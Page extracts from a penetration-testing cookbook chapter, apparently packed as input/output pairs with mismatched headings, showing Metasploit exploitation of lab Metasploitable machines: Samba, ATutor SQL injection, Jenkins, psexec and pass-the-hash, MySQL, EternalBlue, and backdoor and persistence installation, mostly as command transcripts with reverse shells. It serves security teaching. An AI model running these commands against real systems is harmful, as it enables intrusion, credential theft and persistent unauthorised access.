    "output": "Server-Side Exploitation Chapter 3\nGetting ready\n1. First, will use the services command to display the results from our previous\nnmap scan and filter for ports 139 and 445:\nmsf > services -c port,info -p 139,445 192.168.216.129\nServices\n========\nhost port info\n---- ---- ----\n192.168.216.129 139 Samba smbd 3.X - 4.X workgroup: WORKGROUP\n192.168.216.129 445 Samba smbd 3.0.20-Debian workgroup:\nWORKGROUP\nmsf >\n2. Now that we know the version of the Samba daemon running, we can search for\nvulnerabilities and then use the search command to search for available\nexploits.\nBy doing some research online for Common Vulnerabilities and\nExposures (CVE) related to Samba 3.0.20 on https:/​/​www.​cvedetails.\ncom, we can find some vulnerabilities we can exploit.\n3. Using the search command and filtering by CVE, setting the type to display\nonly exploits and the keyword samba, we get a couple of exploits that we might\nbe able to use. Since we have an exploit with the rank of excellent we will check\nthat first.\n[ 92 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nHow to do it...\n1. To select the exploit, employ the use command followed by the exploit name:\nmsf > use exploit/multi/samba/usermap_script\nmsf exploit(usermap_script) >\n2. Now that we have selected the exploit, we can get more information about it by\nrunning the info command:\nmsf exploit(usermap_script) > info\nName: Samba \"username map script\" Command Execution\nModule: exploit/multi/samba/usermap_script\nPlatform: Unix\nArch: cmd\nPrivileged: Yes\nLicense: Metasploit Framework License (BSD)\nRank: Excellent\nDisclosed: 2007-05-14\n...\nPayload information:\nSpace: 1024\nDescription:\nThis module exploits a command execution vulnerability in Samba\nversions 3.0.20 through 3.0.25rc3 when using the non-default\n\"username map script\" configuration option. By specifying a\nusername\ncontaining shell meta characters, attackers can execute arbitrary\ncommands. No authentication is needed to exploit this\nvulnerability\nsince this option is used to map usernames prior to\nauthentication!\n...\nmsf exploit(usermap_script) >\n[ 93 ]\nServer-Side Exploitation Chapter 3\nThe info command with the -f option shows the information in a\nmarkdown version with a browser.\nAs we can see, this module exploits a command execution vulnerability in Samba\nversions 3.0.20 through 3.0.25rc3; great, let's try it.\n3. Using the show missing command, we can see what values we need to fill in to\nuse the exploit:\nmsf exploit(usermap_script) > show missing\nModule options (exploit/multi/samba/usermap_script):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nmsf exploit(usermap_script) >\nTo show the module's advanced options, you can use the show advanced\ncommand.\n4. As expected, to run the exploit we need to specify the IP address of the target, so\nwe will use the set command to specify the RHOST value, and use the exploit\ncommand to exploit the target:\nmsf exploit(usermap_script) > set RHOST 192.168.216.129\nRHOST => 192.168.216.129\nmsf exploit(usermap_script) > exploit\n[*] Started reverse TCP double handler on 192.168.216.5:4444\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo 1igKJmglZhd8d8gz;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: \"1igKJmglZhd8d8gz\\r\\n\"\n[*] Matching...\n[*] A is input...\n[ 94 ]\nServer-Side Exploitation Chapter 3\n[*] Command shell session 1 opened (192.168.216.5:4444 ->\n192.168.216.129:44993) at 2017-10-25 07:13:36 -0400\nhostname\nmetasploitable\n^Z\nBackground session 1? [y/N] y\nmsf exploit(usermap_script) >\nUpon successful execution of the exploit, we will be provided with shell\nconnectivity with our target machine. To verify that we actually have access, we\ncan type some Linux commands, such as the hostname command, to display the\nname of the machine, and to background the session we use Ctrl + Z.\n5. To manipulate sessions, we use the sessions command:\nmsf exploit(usermap_script) > sessions -h\nUsage: sessions [options] or sessions [id]\nActive session manipulation and interaction.\nOPTIONS:\n-C <opt> Run a Meterpreter Command on the session given with -\ni, or all\n-K Terminate all sessions\n-S <opt> Row search filter.\n-c <opt> Run a command on the session given with -i, or all\n...\n-v List sessions in verbose mode\n-x Show extended information in the session table\nMany options allow specifying session ranges using commas and\ndashes.\nFor example: sessions -s checkvm -i 1,3-5 or sessions -k 1-2,5,6\nmsf exploit(usermap_script) >\n6. To go back to the session, we use the sessions command followed by the -i\noption and the session ID; to abort the session we use Ctrl + C:\nmsf exploit(usermap_script) > sessions -i 1\n[*] Starting interaction with 1...\nmetasploitable\nwhoami\n[ 95 ]"
  },
  {
    "input": "What about the payload?",
    "output": "Server-Side Exploitation Chapter 3\nroot\n^C\nAbort session 1? [y/N] y\n[*] 192.168.216.129 - Command shell session 1 closed. Reason: User\nexit\nmsf exploit(usermap_script)>\nHow it works...\nLet's go through a quick note about the service, its exploit, and how it works. Samba is used\nfor printers and file sharing between Linux and Windows machines. This module, by\nspecifying a username containing shell meta characters, can execute arbitrary commands.\nNo authentication is needed to exploit this vulnerability, since this option is used to map\nusernames prior to authentication!\nWhat about the payload?\nSince we didn't specify a payload, Metasploit did that for us; it selected a Unix reverse TCP\nshell, filled in the listen address with our Kali Linux IP address, and used the default listen\nport 4444. To display this information, we can use the show options command:\nmsf exploit(usermap_script) > show options\nModule options (exploit/multi/samba/usermap_script):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.216.129 yes The target address\nRPORT 139 yes The target port (TCP)\nPayload options (cmd/unix/reverse):\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST 192.168.216.5 yes The listen address\nLPORT 4444 yes The listen port\nExploit target:\nId Name\n-- ----\n0 Automatic\n[ 96 ]\nServer-Side Exploitation Chapter 3\nmsf exploit(usermap_script) >\nTo list all the available payloads, we use the show payloads command:\nThe sessions command has one of my favorite options, -u, which will try to upgrade a\nshell to a meterpreter session on many platforms, and allows us to take advantage of all\nthe advanced features of meterpreter:\nmsf exploit(usermap_script) > sessions -u 1\n[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 192.168.216.5:4433\n[*] Sending stage (826872 bytes) to 192.168.216.129\n[ 97 ]"
  },
  {
    "input": "Getting ready",
    "output": "Server-Side Exploitation Chapter 3\n[*] Meterpreter session 2 opened (192.168.216.5:4433 ->\n192.168.216.129:55623) at 2017-10-25 08:50:53 -0400\n[*] Command stager progress: 100.00% (736/736 bytes)\nmsf exploit(usermap_script) >\nBy running the sessions command again, we can see that we now have two sessions:\nSQL injection\nMetasploit has several modules that exploit SQL injection vulnerabilities, allowing us to test\nand verify whether our targets are susceptible to this attack.\nGetting ready\nFor this recipe, we will install a vulnerable version of ATutor, a free open source LMS.\nTo download ATutor 2.2.1, go to https:/​/​www.​exploit-​db.​com/​exploits/​39514/​ and click\nthe save button next to the vulnerable app:\nTo install ATutor, follow the installation instructions at the official\nsite: http:/​/​www.​atutor.​ca/​atutor/​docs/​installation.​php.\n[ 98 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nHow to do it...\nThis module exploits a SQL injection vulnerability and an authentication weakness\nvulnerability in ATutor 2.2.1, meaning that we can bypass authentication, reach the\nadministrator's interface, and upload malicious code.\n1. First, let us look at the exploit/multi/http/atutor_sqli exploit options:\n2. Before running the exploit, we can use the check command to verify if the target\nis vulnerable:\nmsf exploit(atutor_sqli) > check\n[+] 192.168.216.136:80 The target is vulnerable.\nmsf exploit(atutor_sqli) >\n3. To exploit the ATutor 2.2.1 SQL injection vulnerability, we need to set the target\nhost IP address and run the module:\nmsf exploit(atutor_sqli) > set RHOST 192.168.216.136\nRHOST => 192.168.216.135\nmsf exploit(atutor_sqli) > set TARGETURI /\nTARGETURI => /\nmsf exploit(atutor_sqli) > exploit\n[ 99 ]"
  },
  {
    "input": "Types of shell",
    "output": "Server-Side Exploitation Chapter 3\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] 192.168.216.136:80 - Dumping the username and password hash...\n[+] 192.168.216.136:80 - Got the admin's hash:\n5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 !\n...\n[!] This exploit may require manual cleanup of\n'/var/content/module/cqi/duso.php' on the target\nmeterpreter >\n[+] 192.168.216.136:80 - Deleted duso.php\nmeterpreter > getuid\nServer username: www-data (33)\nmeterpreter >\nOn successful execution of the module, we get remote access to the web server\nwith the privileges of the HTTP server\nTypes of shell\nBefore moving to the next topic, let's talk about the different types of shell available. When\nlooking at the list of available shells, they fall into two categories: bind and reverse.\nA bind shell instructs the target to start the command shell and listen on a local port,\nallowing the attacker to connect to the target on the listening port. A bind shell is great for\nlocal vulnerabilities, for example, when you have already compromised a target machine\nvia a phishing attack and want to leverage a local service to do privilege escalation;\nhowever, nowadays it is not suitable for most remote exploitation scenarios because the\ntarget is probably behind a firewall.\nFor that reason, most of the time we will use a reverse shell as our payload. A reverse shell\nstarts a connection with the attacker's machine, in this case, the attacker's machine is the one\nthat is opening a local port and listening for a connection, and since most outbound rules\nare more on-premise, a reverse shell is more likely to bypass the firewall.\nPayloads\nThere are three different types of payload module in the Metasploit Framework: singles,\nstagers, and stages. Singles are payloads that are self-contained and completely standalone.\nA single payload can be something as simple as adding a user to the target system or\nrunning an executable.\n[ 100 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nA stager will set up a network connection between the attacker and victim, and it is\ndesigned to be small and reliable.\nStages are payload components downloaded by the stager, and provide advanced features\nwith no size limits such as dllinject, meterpreter, patchupdllinject, upexec,\nvncinject, among others.\nGetting ready\nSince we already have a working exploit from our previous recipe, we will use it to test the\ndifferent types of payload.\nHow to do it...\n1. First, we will use the show payloads command to display all compatible\npayloads:\n[ 101 ]\nServer-Side Exploitation Chapter 3\n2. To get more information about a specific payload, we can use the info command\nfollowed by the payload name:\nmsf exploit(atutor_sqli) > info payload/generic/shell_bind_tcp\nName: Generic Command Shell, Bind TCP Inline\nModule: payload/generic/shell_bind_tcp\nPlatform: All\n...\nProvided by:\nskape <mmiller@hick.org>\nBasic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nLPORT 4444 yes The listen port\nRHOST no The target address\nDescription:\nListen for a connection and spawn a command shell\nmsf exploit(atutor_sqli) >\n3. generic/shell_bind_tcp is a single standalone generic bind TCP command\nshell. To select the shell_bind_tcp as our payload, we use the set PAYLOAD\ncommand followed by the payload name:\nmsf exploit(atutor_sqli) > set PAYLOAD generic/shell_bind_tcp\nPAYLOAD => generic/shell_bind_tcp\nmsf exploit(atutor_sqli) > exploit\n[*] Started bind handler\n[*] 192.168.216.136:80 - Dumping the username and password hash...\n[+] 192.168.216.136:80 - Got the admin's hash:\n5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 !\n[*] Command shell session 1 opened (192.168.216.5:41033 ->\n192.168.216.136:4444) at 2017-10-26 10:33:45 -0400\n[+] 192.168.216.136:80 - Deleted soae.php\n[!] Tried to delete /var/content/module/mgp/soae.php, unknown\nresult\n...\nBackground session 1? [y/N] y\nmsf exploit(atutor_sqli) >\n[ 102 ]\nServer-Side Exploitation Chapter 3\n4. Using the generic/shell_bind_tcp, we got a generic command shell, useful\nbut far from ideal. A feature-rich and more advanced payload that we can use\nwith this exploit is PHP Meterpreter:\nmsf exploit(atutor_sqli) > info payload/php/meterpreter/reverse_tcp\nName: PHP Meterpreter, PHP Reverse TCP Stager\nModule: payload/php/meterpreter/reverse_tcp\nPlatform: PHP\nArch: php\nNeeds Admin: No\nTotal size: 1101\nRank: Normal\nProvided by:\negypt <egypt@metasploit.com>\n...\nmsf exploit(atutor_sqli) >\n5. When using reverse shells, such as php/meterpreter/reverse_tcp, we need\nto specify the listen address with set LHOST, which will be the IP address of our\nKali Linux machine, and the listen port with the set LPORT command, if we do\nnot want to use the default port 4444:\nmsf exploit(atutor_sqli) > set PAYLOAD php/meterpreter/reverse_tcp\nPAYLOAD => php/meterpreter/reverse_tcp\nmsf exploit(atutor_sqli) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(atutor_sqli) > exploit\n...\nmeterpreter >\n[+] 192.168.216.136:80 - Deleted dmci.php\nmeterpreter > getuid\nServer username: www-data (33)\nmeterpreter >\n[ 103 ]"
  },
  {
    "input": "Getting ready",
    "output": "Server-Side Exploitation Chapter 3\nExploiting a Windows Server machine\nLeveraging the information collected during information gathering and scanning, we will\nenter the world of exploits. In this recipe, we will see how we can use Metasploit to break\ninto our Metasploitable 3 target system, which is running Windows Server 2008 R2. We will\nbe using the commands we learned in the previous section, and then move ahead to select\nexploits and payloads, and set up various required parameters.\nGetting ready\nWe will start our penetration testing process right from msfconsole. So, launch the console\nand perform a port scan to gather information about the target. We discussed port scanning\nin detail in the previous chapter. Here, I will assume that you have gathered information\nabout the target system and its services. So, let's proceed with selecting exploits and\npayloads.\nSometimes, looking at the output of a Nmap or even vulnerability scanners is not enough.\nThe output of the services command just shows us that the server is running a version of\nApache:\nmsf > services -p 8020 192.168.216.10\nServices\n========\nhost port proto name state info\n---- ---- ----- ---- ----- ----\n192.168.216.10 8020 tcp http open Apache httpd\nmsf >\n[ 104 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nThere is a reason why penetration tests are not automated tasks; humans are curious and\nthey tend to look beyond service banners.\nAs you can see from the screenshot, the web page has all the information we need to search\nfor vulnerabilities, so do not forget to manually check your targets sites. I cannot stress\nenough how many times junior pentesters miss trivial vulnerabilities such as default\ncredentials, just because they did not open the target site in a browser.\nWhen we see data breaches in the news, most of the time it is due to password reuse; for\nthat reason psexec is one of the tools most frequently used by penetration testers.\nHow to do it...\n1. Looking at the service running on port 8484 of the target system, we can see that\nit is running Jenkins; from the Jenkins-CI Enumeration auxiliary module output\nused in the previous chapter, we know its version:\nmsf > services 192.168.216.10 -p 8484\n​\nServices\n[ 105 ]\nServer-Side Exploitation Chapter 3\n========\n​\nhost port proto name state info\n---- ---- ----- ---- ----- ----\n192.168.216.10 8484 tcp http open Jenkins Version - 1.637\n​\nmsf >\nWith this information, we can do a quick search using the search command and\nsee what exploits are available:\n2. To exploit the system, we will use the Jenkins-CI Script-Console Java Execution\nexploit:\nmsf exploit(jenkins_script_console) > setg RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(jenkins_script_console) > set RPORT 8484\nRPORT => 8484\nmsf exploit(jenkins_script_console) > set TARGETURI /\nTARGETURI => /\nmsf exploit(jenkins_script_console) > exploit\n​...\n​\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\nmeterpreter >\n[ 106 ]\nServer-Side Exploitation Chapter 3\nLet's have a look at what we have done so far. setg sets a value in the global\ndatastore; this way the next module we use will already have the RHOST value\ndefined. To use this exploit, we also need to specify the remote port and the path\nto the Jenkins-CI application, then use the exploit command to exploit the\ntarget.\nThe unset command is used to unset one or more variables. To flush all\nentries, specify all as the variable name, and -g operates on global\ndatastore variables.\n3. Since we did not specify a payload, Metasploit made that choice for us:\nBy default, Metasploit used a reverse TCP meterpreter payload. However, we\nhave several payloads available; to list all the compatible payloads, you can use\nthe show payloads command.\n[ 107 ]\nServer-Side Exploitation Chapter 3\n4. Now that we know that the target is running ManageEngine Desktop Central\nversion 9, we can use the search command to look for available exploits:\nLooking at the output, we have a few candidates; again this is why penetration\ntesters have not yet been replaced by a script. After carefully looking at the\noutput, we can see that the ManageEngine Desktop Central 9 FileUploadServlet\nConnectionId Vulnerability is a match, and we can move to the next stage and\nexploit the target:\nmsf > use exploit/windows/http/manageengine_connectionid_write\nmsf exploit(manageengine_connectionid_write) > set PAYLOAD\nwindows/meterpreter/reverse_http\nPAYLOAD => windows/meterpreter/reverse_http\nmsf exploit(manageengine_connectionid_write) > set LHOST\n192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(manageengine_connectionid_write) > exploit\n...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\LOCAL SERVICE\nmeterpreter >\nThis time, we have specified the payload, and we choose to use the Windows\nMeterpreter Reverse HTTP Stager, which will inject the meterpreter server DLL\nvia the reflective DLL injection payload and tunnel communication over HTTP.\nBy using HTTP, this payload has a better chance of bypassing the outbound\nfirewall rules, since most will allow machines to establish sessions to remote\nHTTP servers.\n[ 108 ]\nServer-Side Exploitation Chapter 3\n5. To use psexec within Metasploit, we have a couple of options; to list all the\npsexec exploits we can use the search command:\nFor this recipe, we will take a look at the psexec and psexec_psh exploits. In the\ninformation gathering and scanning phase, we were able to brute force some\naccounts; using those credentials, we will take a look at what an adversary can do\nwhen users reuse their passwords:\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set SMBUSER Administrator\nSMBUSER => Administrator\nmsf exploit(psexec) > set SMBPASS vagrant\nSMBPASS => vagrant\nmsf exploit(psexec) > run\n...\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\nmeterpreter > background\n[*] Backgrounding session 1...\nmsf exploit(psexec) >\nThe Microsoft Windows Authenticated User Code Execution module uses a valid\nadministrator username and password (or password hash) to execute an arbitrary\npayload, similar to the psexec utility provided by SysInternals.\n[ 109 ]"
  },
  {
    "input": "How to do it",
    "output": "Server-Side Exploitation Chapter 3\nAnother alternative is to use the hash attack in which an attacker steals a user's hash and,\nwithout cracking it, reuses it to trick an authentication system into creating a new\nauthenticated session:\nmsf exploit(psexec) > set SMBPASS\naad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b\nSMBPASS =>\naad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b\nmsf exploit(psexec) > exploit\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] 192.168.216.10:445 - Connecting to the server...\n...\nmeterpreter >\nExploiting common services\nWhen talking about exploitation, a couple of services come to mind, mostly related to the\nfact that they are common on most targets, and most of the time neglected.\nGetting ready\nIn this recipe, we will exploit one the most common and abused services that you will find\nin a target environment, MySQL. Most of the time we can exploit MySQL services because\nthey were installed for development purposes, disregarding some best practices such as\nsetting a root password or using strong passwords.\nHow to do it\nTo exploit the MySQL service on the Metasploitable 3 target machine, we will use the\nMySQL Enumeration Module auxiliary module to enumerate the target, and the Oracle\nMySQL for the Microsoft Windows Payload Execution exploit module to gain a remote\nshell:\nmsf > use auxiliary/admin/mysql/mysql_enum\nmsf auxiliary(mysql_enum) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf auxiliary(mysql_enum) > set USERNAME root\nUSERNAME => root\nmsf auxiliary(mysql_enum) > run\n[ 110 ]"
  },
  {
    "input": "MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption",
    "output": "Server-Side Exploitation Chapter 3\n[*] 192.168.216.10:3306 - Running MySQL Enumerator...\n[*] 192.168.216.10:3306 - Enumerating Parameters\n...\nmsf auxiliary(mysql_enum) > use exploit/windows/mysql/mysql_payload\nmsf exploit(mysql_payload) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(mysql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(mysql_payload) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(mysql_payload) > exploit\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] 192.168.216.10:3306 - Checking target architecture...\n[*] 192.168.216.10:3306 - Checking for sys_exec()...\n[*] 192.168.216.10:3306 - sys_exec() already available, using that\n(override with FORCE_UDF_UPLOAD).\n...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter >\nSince the target doesn't have a root password, it is possible to use the MySQL service to\nupload a shell and gain remote access to the system. So, never forget to test the basics, even\nif you think that no one would configure a service without a password.\nMS17-010 EternalBlue SMB Remote\nWindows Kernel Pool Corruption\nAgain, leveraging the intel collected during the information gathering and scanning phase,\nparticularly the output of the MS17-010 SMB RCE Detection auxiliary module, we can move\nto our next vulnerable service.\n[ 111 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nGetting ready\nWithout going into too much detail, the MS17-010 EternalBlue SMB Remote Windows\nKernel Pool Corruption exploit module is a part of the Equation Group ETERNALBLUE\nexploit, part of the FuzzBunch toolkit released by Shadow Brokers, generally believed to be\ndeveloped by the U.S. National Security Agency (NSA) and used as part of the WannaCry\nransomware attack. It is a buffer overflow in the memmove operation in\nSrv!SrvOs2FeaToNt that allows us to execute an arbitrary payload. This vulnerability affects\nWindows machines without security update MS17-010 for Microsoft Windows SMB\nServer SMBv1 Server.\nHow to do it...\nTo launch the exploit, use the MS17-010 EternalBlue SMB Remote Windows Kernel Pool\nCorruption exploit module, set the target IP address, use a meterpreter reverse TCP\npayload, and specify the listening address:\nmsf > use exploit/windows/smb/ms17_010_eternalblue\nmsf exploit(ms17_010_eternalblue) > set RHOST 192.168.216.10\nRHOST => 192.168.216.10\nmsf exploit(ms17_010_eternalblue) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(ms17_010_eternalblue) > set LHOST 192.168.216.5\nRHOST => 192.168.216.5\nmsf exploit(ms17_010_eternalblue) > exploit\n...\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build 7601, Service Pack 1).\n...\nmeterpreter >\nOne outcome of a penetration test that differentiates it from a vulnerability scanner, is that\nno one will state that what you've found is a false positive when you present them with a\nscreenshot of a shell running on the target system.\n[ 112 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nMS17-010\nEternalRomance/EternalSynergy/EternalCha\nmpion\nThe MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows\nCode Execution exploit module can be used to exploit MS17-010 vulnerabilities via\nEternalRomance, EternalSynergy, and EternalChampion. This exploit is more reliable than\nthe EternalBlue exploit but requires a named pipe.\nHow to do it...\nTo launch the exploit, use the MS17-010 EternalRomance/EternalSynergy/EternalChampion\nSMB Remote Windows Code Execution exploit module, set the target IP address, use a\nmeterpreter reverse TCP payload, and specify the listening address:\n[ 113 ]"
  },
  {
    "input": "How to do it...",
    "output": "Server-Side Exploitation Chapter 3\nInstalling backdoors\nHaving a shell on the target system is great, but sometimes it is not enough. With a\nbackdoor, we will be able to ensure persistence and get access to the system, even if the\nvulnerability gets patched.\nGetting ready\nNow that we have a session in the target system, we will use that session to backdoor a\nservice; in this recipe, we will start by backdooring the Apache server:\nNext, we will use the Windows Registry Only Persistence local exploit module to create a\nbackdoor that is executed during boot.\nLastly, we will use Windows Management Instrumentation (WMI) to create a persistent\nfileless backdoor. The WMI Event Subscription Persistence exploit module creates a\npermanent WMI event subscription to achieve file-less persistence.\nHow to do it...\n1. Since we cannot backdoor a binary while it is running, the first thing we need to\ndo is to kill the Apache process (httpd.exe), using the kill command followed\nby the PID of the process:\nmeterpreter > kill 3820\nKilling: 3820\nmeterpreter >\n[ 114 ]\nServer-Side Exploitation Chapter 3\n2. Then, we use the download command within meterpreter to download the\nservice binary we want to backdoor:\nmeterpreter > download\nC:\\\\wamp\\\\bin\\\\apache\\\\apache2.2.21\\\\bin\\\\httpd.exe\n[*] Downloading: C:\\wamp\\bin\\apache\\apache2.2.21\\bin\\httpd.exe ->\nhttpd.exe\n...\nmsf exploit(ms17_010_eternalblue) >\nTo backdoor the service, we will use msfconsole, with a reverse TCP.\n3. Set the listen address to our Kali Linux machine IP address and use the generate\ncommand to backdoor the binary, using the -a option to specify the architecture,\n-p for the platform, -x for the executable template to use, -k to keep the template\nexecutable functional, -t for the output format, and -f for the output filename:\nmsf exploit(ms17_010_eternalblue) > use\npayload/windows/x64/meterpreter/reverse_tcp\nmsf payload(reverse_tcp) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf payload(reverse_tcp) > generate -a x64 -p Windows -x\n/root/httpd.exe -k -t exe -f httpd-backdoored.exe\n[*] Writing 29184 bytes to httpd-backdoored.exe...\nmsf payload(reverse_tcp) >\n4. Now that we have the backdoor ready, we need to start a listener for the reverse\nconnection; for that we will use the Generic Payload Handler:\nmsf payload(reverse_tcp) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD\nwindows/x64/meterpreter/reverse_tcp\nPAYLOAD => windows/x64/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(handler) >\nThe exploit -j command will run it in the context of a job, allowing us to go\nback to our session and continue the attack.\n[ 115 ]\nServer-Side Exploitation Chapter 3\n5. Back in the session, we will rename the httpd.exe file to httpd.exe.backup,\nupload the backdoored version, and rename it to httpd.exe:\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > cd C:\\\\wamp\\\\bin\\\\apache\\\\apache2.2.21\\\\bin\\\\\nmeterpreter > mv httpd.exe httpd.exe.backup\nmeterpreter > upload httpd-backdoored.exe\n[*] uploading : httpd-backdoored.exe -> httpd-backdoored.exe\n[*] uploaded : httpd-backdoored.exe -> httpd-backdoored.exe\nmeterpreter > mv httpd-backdoored.exe httpd.exe\nmeterpreter >\n6. Then, we will drop into a system command shell, and use the net stop\ncommand to stop the wampapache and net start to start it up again:\nmeterpreter > shell\nProcess 2272 created.\nChannel 3 created.\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation. All rights reserved.\nC:\\wamp\\bin\\apache\\apache2.2.21\\bin>net stop wampapache\nnet stop wampapache\n...\nC:\\wamp\\bin\\apache\\apache2.2.21\\bin>^Z\nBackground channel 3? [y/N] y\nmeterpreter >\nAs you can see from the output, as soon as we started the service, we got two new\nmeterpreter sessions on the target system:\n[ 116 ]\nServer-Side Exploitation Chapter 3\n7. To use the Windows Registry Only Persistence module, we need to specify the\nsession to run the module on, in this case, session 1 with what we got from the\nMS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit; set\nthe payload; set the listening IP address; and use the exploit command to launch\nthe exploit:\nmsf > use exploit/windows/local/registry_persistence\nmsf exploit(registry_persistence) > set SESSION 1\nSESSION => 1\nmsf exploit(registry_persistence) > set PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(registry_persistence) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(registry_persistence) > exploit\n...\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\16jfvtho\n[*] Clean up Meterpreter RC file:\n/root/.msf4/logs/persistence/192.168.216.10_20171029.4303/192.168.2\n16.10_20171029.4303.rc\n8. Now that we successfully installed the backdoor registry key, we need to set up\nour listener so that the next time the machine reboots we will get a session:\nmsf exploit(registry_persistence) > use exploit/multi/handler\nmsf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler) > run -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 192.168.216.5:4444\nmsf exploit(handler) >\n9. To trigger the exploit, simply reboot the Metasploitable 3 machine and we will\nget a new session:\nmsf exploit(handler) >\n[*] Sending stage (179267 bytes) to 192.168.216.10\n[*] Meterpreter session 2 opened (192.168.216.5:4444 ->\n192.168.216.10:49290) at 2017-10-29 07:39:45 -0400\nmsf exploit(registry_persistence) > sessions -i 2\n[*] Starting interaction with 2...\n[ 117 ]\nServer-Side Exploitation Chapter 3\nmeterpreter > sysinfo\nComputer : VAGRANT-2008R2\nOS : Windows 2008 R2 (Build 7601, Service Pack 1).\nArchitecture : x64\nSystem Language : en_US\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter : x86/windows\nmeterpreter >\nGreat, we got a new session from the target system.\n10. To use the WMI Event Subscription Persistence local exploit module, we first\nneed to specify the session to run the module on. Then, we set the time between\ncallbacks to one minute, so we do not have to wait 30 minutes, which is the\ndefault time; next set the event ID to trigger the payload to 4624 (successful\nlogon), set the username to trigger the payload to Administrator, and use the\nexploit command to launch the exploit:\nmsf > use exploit/windows/local/wmi_persistence\nmsf exploit(wmi_persistence) > set SESSION 1\nSESSION => 1\nmsf exploit(wmi_persistence) > set CALLBACK_INTERVAL 60000\nCALLBACK_INTERVAL => 60000\nmsf exploit(wmi_persistence) > set EVENT_ID_TRIGGER 4624\nEVENT_ID_TRIGGER => 4624\nmsf exploit(wmi_persistence) > set USERNAME_TRIGGER Administrator\nUSERNAME_TRIGGER => Administrator\nmsf exploit(wmi_persistence) > set LPORT 4445\nLPORT => 4445\nmsf exploit(wmi_persistence) > exploit\n[-] This module cannot run as System\nmsf exploit(wmi_persistence) >\n11. Looking at the output, we have encountered a problem; the module cannot run as\nsystem, which means we will have to go back to the session and use the migrate\ncommand to migrate to a process running in the context of the user:\nmsf exploit(wmi_persistence) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > migrate -N explorer.exe\n[*] Migrating from 5700 to 4624...\n[ 118 ]"
  },
  {
    "input": "Denial of Service",
